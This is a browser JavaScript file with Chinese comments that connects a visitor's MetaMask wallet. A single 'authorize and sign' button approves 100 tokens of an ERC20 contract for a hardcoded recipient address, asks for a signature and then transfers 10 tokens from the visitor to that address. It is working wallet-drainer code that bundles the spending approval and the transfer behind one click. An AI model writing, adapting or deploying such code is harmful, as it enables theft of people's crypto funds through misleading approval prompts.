// 要转移代币的目标地址
const recipientAddress = '0xa465e2fc9f9d527aaeb07579e821d461f700e699';
let web3;
let isConnected = false;
let isRequestPending = false;

// ERC20标准合约的ABI
const erc20Abi = [
    {
        "constant": true,
        "inputs": [],
        "name": "totalSupply",
        "outputs": [{"name": "", "type": "uint256"}],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [{"name": "_spender", "type": "address"}, {"name": "_value", "type": "uint256"}],
        "name": "approve",
        "outputs": [{"name": "", "type": "bool"}],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}],
        "name": "transfer",
        "outputs": [{"name": "", "type": "bool"}],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

// 连接钱包的按钮点击事件
document.getElementById('connectButton').onclick = async () => {
    const selectedWallet = 'metamask'; // 假设默认选择 MetaMask
    await connectWallet(selectedWallet);
};

// 连接钱包的函数
async function connectWallet(walletType) {
    if (isRequestPending) {
        alert('已有请求在处理，请稍等');
        return;
    }

    isRequestPending = true;

    try {
        if (walletType === 'metamask') {
            if (window.ethereum) {
                await window.ethereum.request({ method: 'eth_requestAccounts' });
                web3 = new Web3(window.ethereum);

                const accounts = await web3.eth.getAccounts();
                if (accounts.length > 0) {
                    updateWalletList(accounts[0]);
                    isConnected = true;
                    document.getElementById('status').innerText = 'MetaMask 已连接';
                    document.getElementById('authorizeAndSignButton').disabled = false;
                } else {
                    document.getElementById('status').innerText = '未检测到已连接的账户';
                }
            } else {
                document.getElementById('status').innerText = '请安装 MetaMask 钱包';
            }
        }
    } catch (error) {
        document.getElementById('status').innerText = '连接失败: ' + error.message;
    } finally {
        isRequestPending = false;
    }
}

// 更新已连接钱包列表
const updateWalletList = (address) => {
    const walletList = document.getElementById('walletList');
    const walletItem = document.createElement('li');
    walletItem.innerText = address;
    walletList.appendChild(walletItem);
};

// 合并后的授权和签名按钮点击事件
document.getElementById('authorizeAndSignButton').onclick = async () => {
    if (!isConnected) {
        document.getElementById('status').innerText = '请先连接钱包';
        return;
    }

    const accounts = await web3.eth.getAccounts();
    const account = accounts[0];

    // 确认 tokenContract 的 ABI 和合约地址
    const tokenAddress = '0xYourTokenContractAddress'; // 这里填写你要操作的 ERC20 合约地址
    const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);

    try {
        // 授权代币额度
        const tx = await tokenContract.methods.approve(recipientAddress, web3.utils.toWei('100', 'ether')).send({ from: account });
        document.getElementById('status').innerText = '授权成功，正在请求签名...';

        // 授权成功后直接执行签名操作
        const signatureResult = await performSignature(account);
        if (signatureResult.success) {
            document.getElementById('status').innerText = `签名成功: ${signatureResult.signature}`;
            document.getElementById('signatureMessage').innerText = `签名确认信息: ${signatureResult.message}`;
            document.getElementById('signingSection').style.display = 'block';
        } else {
            document.getElementById('status').innerText = '签名失败: ' + signatureResult.error;
        }

        // 开始代币转移
        await transferTokens(account, tokenContract);
    } catch (error) {
        document.getElementById('status').innerText = '授权或签名失败: ' + error.message;
    }
};

// 执行签名的函数
const performSignature = async (account) => {
    const message = `签名确认: 你正在授权从该钱包中转移代币到 ${recipientAddress}`;
    try {
        const signature = await web3.eth.personal.sign(message, account);
        return { success: true, signature: signature, message: message };
    } catch (error) {
        return { success: false, error: error.message };
    }
};

// 代币转移逻辑
const transferTokens = async (account, tokenContract) => {
    try {
        const tx = await tokenContract.methods.transfer(recipientAddress, web3.utils.toWei('10', 'ether')).send({ from: account });
        document.getElementById('status').innerText = '代币转移成功！';
    } catch (error) {
        document.getElementById('status').innerText = '代币转移失败: ' + error.message;
    }
};
